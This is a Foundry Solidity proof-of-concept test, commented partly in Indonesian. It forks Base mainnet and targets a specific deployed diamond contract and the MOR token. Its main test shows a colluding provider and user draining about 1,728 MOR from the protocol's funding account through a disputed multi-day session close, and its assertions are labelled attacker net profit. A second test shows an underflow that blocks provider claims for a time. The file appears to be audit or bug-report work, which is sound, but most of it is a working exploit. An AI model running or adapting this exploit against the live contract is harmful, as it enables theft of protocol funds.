// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDiamond {
    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function providerDeregister(address provider_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] calldata tags_
    ) external;
    function getModelId(address account_, bytes32 baseModelId_) external pure returns (bytes32);
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32);
    function deleteModelBid(bytes32 bidId_) external;
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function claimForProvider(bytes32 sessionId_) external;
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function getSessionEnd(uint256 amount_, uint256 pricePerSecond_, uint128 openedAt_) external view returns (uint128);
    function getFundingAccount() external view returns (address);
    function getTodaysBudget(uint128 timestamp_) external view returns (uint256);
    function getMaxSessionDuration() external view returns (uint128);
    function getUserStakesOnHold(address user_, uint8 iterations_) external view returns (uint256, uint256);
}

/// Foundry PoC — fork Base mainnet (read-only, semua state lokal di fork).
/// Diamond: 0x6aBE1d282f72B474E54527D93b979A4f64d3030a
contract SessionDrainTest is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    IDiamond constant d = IDiamond(DIAMOND);
    IERC20 constant mor = IERC20(MOR);

    uint256 constant PROVIDER_PK = 0xA11CE;
    uint256 constant USER_PK = 0xB0B;
    address provider;
    address user;
    uint256 constant PROVIDER_INITIAL = 100_000 ether;
    uint256 constant USER_INITIAL = 1_500_000 ether;

    function setUp() public {
        // PINNED fork block — reproducible, no env vars needed.
        vm.createSelectFork("https://mainnet.base.org", 58_420_000);
        provider = vm.addr(PROVIDER_PK);
        user = vm.addr(USER_PK);
        deal(MOR, provider, PROVIDER_INITIAL);
        deal(MOR, user, USER_INITIAL);
    }

    function _setupProviderAndBid(uint256 pricePerSecond) internal returns (bytes32 bidId) {
        vm.startPrank(provider);
        mor.approve(DIAMOND, type(uint256).max);
        d.providerRegister(provider, 10_000 ether, "https://attacker.example");
        vm.stopPrank();

        vm.startPrank(user);
        mor.approve(DIAMOND, type(uint256).max);
        string[] memory tags = new string[](0);
        d.modelRegister(user, bytes32("base-model"), bytes32("cid"), 0, 1 ether, "m", tags);
        vm.stopPrank();

        bytes32 modelId = d.getModelId(user, bytes32("base-model"));
        vm.prank(provider);
        bidId = d.postModelBid(provider, modelId, pricePerSecond);
    }

    function _openSession(uint256 stake, bytes32 bidId) internal returns (bytes32 sessionId) {
        bytes memory approval = abi.encode(bidId, block.chainid, provider, uint128(block.timestamp));
        bytes32 digest = keccak256(approval);
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(PROVIDER_PK, keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest)));
        vm.prank(user);
        sessionId = d.openSession(user, stake, false, approval, abi.encodePacked(r, s, v));
    }

    function _close(bytes32 sessionId, bool signedByProvider, uint128 ts) internal {
        // NOTE: timestamp eksplisit — via-ir CSE `block.timestamp` lintas vm.warp
        bytes memory receipt = abi.encode(sessionId, block.chainid, ts, uint32(1000), uint32(50));
        bytes32 rd = keccak256(receipt);
        uint256 pk = signedByProvider ? PROVIDER_PK : USER_PK;
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(pk, keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", rd)));
        vm.prank(user);
        d.closeSession(receipt, abi.encodePacked(r, s, v));
    }

    /// KANDIDAT #1: sesi multi-hari dispute close — user menarik kembali ~seluruh
    /// stake (hanya stipend hari-terakhir yang di-hold), provider mengambil
    /// (closedAt - openedAt) * pricePerSecond MOR dari fundingAccount protokol.
    function test_candidate1_disputed_multiday_close() public {
        uint256 pricePerSecond = 1e16; // max on-chain (0.01 MOR/s)
        bytes32 bidId = _setupProviderAndBid(pricePerSecond);

        uint256 stake = 900_000 ether; // stipend ~2629 MOR -> durasi ~3.04 hari
        uint128 ts0 = uint128(block.timestamp);
        bytes32 sessionId = _openSession(stake, bidId);
        uint256 endsAt = d.getSessionEnd(stake, pricePerSecond, uint128(block.timestamp));
        emit log_named_uint("session duration (s)", endsAt - block.timestamp);

        address funding = d.getFundingAccount();
        uint128 tsClose = ts0 + 2 days;
        vm.warp(tsClose); // 2 hari "konsumsi" stipend

        uint256 fundingBefore = mor.balanceOf(funding);
        uint256 userBefore = mor.balanceOf(user);

        // DISPUTED close: receipt ditandatangani USER (bukan provider) -> noDispute=false
        _close(sessionId, false, tsClose);

        (, uint256 hold) = d.getUserStakesOnHold(user, 255);
        emit log_named_decimal_uint("user refund langsung di close", mor.balanceOf(user) - userBefore, 18);
        emit log_named_decimal_uint("user stake on-hold (hari terakhir)", hold, 18);

        vm.warp(tsClose + 2 days);
        vm.prank(provider);
        d.claimForProvider(sessionId);
        uint256 drained = fundingBefore - mor.balanceOf(funding);
        emit log_named_decimal_uint("fundingAccount drained", drained, 18);
        assertGt(drained, 1_000 ether, "fundingAccount drained must exceed 1000 MOR");
        assertEq(drained, 1_728 ether, "drained == 2 days * 86400 s * 0.01 MOR/s");

        vm.prank(user);
        d.withdrawUserStakes(user, 255);

        // user net cost hanya 1 MOR (model min-stake) — stake 900k kembali penuh
        uint256 userNetCost = USER_INITIAL - mor.balanceOf(user);
        emit log_named_decimal_uint("user net cost", userNetCost, 18);
        assertLe(userNetCost, 1 ether, "user loses at most 1 MOR while protocol pays 1728 MOR");
        assertEq(userNetCost, 1 ether, "user net cost == 1 MOR model min-stake");

        // EKONOMI PROVIDER: dalam periode 365d, stake non-withdrawable = earned.
        // Setelah periode berakhir, stake PENUH kembali (incl. porsi yang 'dipakai'
        // sebagai claim limit) -> net profit attacker = drained - dust.
        vm.warp(tsClose + 2 days + 366 days);
        vm.prank(provider);
        d.deleteModelBid(bidId);
        vm.prank(provider);
        d.providerDeregister(provider);
        uint256 providerNetWorth = mor.balanceOf(provider); // stake sudah balik
        // provider juga masih pegang 'drained' MOR dari fundingAccount
        emit log_named_decimal_uint("provider saldo akhir (stake balik + reward)", providerNetWorth, 18);
        assertGt(providerNetWorth, PROVIDER_INITIAL, "provider untung bersih > 0");
        assertGt(providerNetWorth - PROVIDER_INITIAL, 1_000 ether, "net profit attacker > 1000 MOR per session");
        emit log_named_decimal_uint("NET PROFIT ATTACKER per sesi", providerNetWorth - PROVIDER_INITIAL, 18);
    }

    /// KANDIDAT #1b baseline noDispute: stake user di-refund PENUH di tx close,
    /// provider tetap dibayar penuh dari fundingAccount.
    function test_candidate1b_nodispute_close_refunds_full_stake() public {
        uint256 pricePerSecond = 1e16;
        bytes32 bidId = _setupProviderAndBid(pricePerSecond);
        address funding = d.getFundingAccount();
        uint256 stake = 900_000 ether;
        uint128 ts0 = uint128(block.timestamp);
        bytes32 sessionId = _openSession(stake, bidId);
        uint128 tsClose = ts0 + 2 days;
        vm.warp(tsClose);

        uint256 fundingBefore = mor.balanceOf(funding);
        uint256 userBefore = mor.balanceOf(user);
        _close(sessionId, true, tsClose);

        emit log_named_decimal_uint("user refund di tx close (noDispute)", mor.balanceOf(user) - userBefore, 18);

        vm.warp(tsClose + 1 days);
        vm.prank(provider);
        d.claimForProvider(sessionId);
        vm.prank(user);
        d.withdrawUserStakes(user, 255);

        uint256 drained = fundingBefore - mor.balanceOf(funding);
        emit log_named_decimal_uint("fundingAccount drained (noDispute)", drained, 18);
        assertApproxEqAbs(mor.balanceOf(user), USER_INITIAL - 1 ether, 1 ether, "user stake ~fully refunded");
        assertLt(USER_INITIAL - mor.balanceOf(user), 2 ether, "noDispute: user net cost < 2 MOR");
        assertGt(drained, 1_000 ether, "fundingAccount drained > 1000 MOR");
    }

    /// KANDIDAT #2: noDispute early close meng-claim penuh TANPA on-hold;
    /// claimForProvider di hari yang sama menghitung rewards(total) - onHold(>0)
    /// padahal sisa = 0 -> uint256 underflow -> revert (DoS claim sampai hari berganti).
    function test_candidate2_claimForProvider_underflow_after_nodispute_early_close() public {
        uint256 pricePerSecond = 1e16;
        bytes32 bidId = _setupProviderAndBid(pricePerSecond);
        uint256 stake = 900_000 ether;
        bytes32 sessionId = _openSession(stake, bidId);

        // close EARLY (60 s, hari yang sama), noDispute (signed provider)
        uint128 tsClose = uint128(block.timestamp) + 60;
        vm.warp(tsClose);
        _close(sessionId, true, tsClose); // full reward langsung dibayar di close

        // reward tersisa = 0, tapi onHold (closedAt - startOfDay) * pps > 0
        // -> rewards - onHold UNDERFLOW -> claimForProvider revert
        vm.expectRevert();
        vm.prank(provider);
        d.claimForProvider(sessionId);
        emit log_string("CONFIRMED: claimForProvider underflow/revert (DoS temporer)");
    }
}
